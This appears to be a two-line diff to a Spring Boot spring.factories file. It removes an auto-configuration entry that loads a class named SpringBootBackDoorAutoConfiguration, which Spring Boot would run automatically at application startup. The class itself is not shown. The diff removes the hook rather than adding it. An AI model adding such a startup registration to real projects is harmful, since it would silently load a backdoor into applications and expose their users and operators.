@@ -1,2 +1,0 @@
-org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
-  pro.topme.springbootbackdoor.SpringBootBackDoorAutoConfiguration
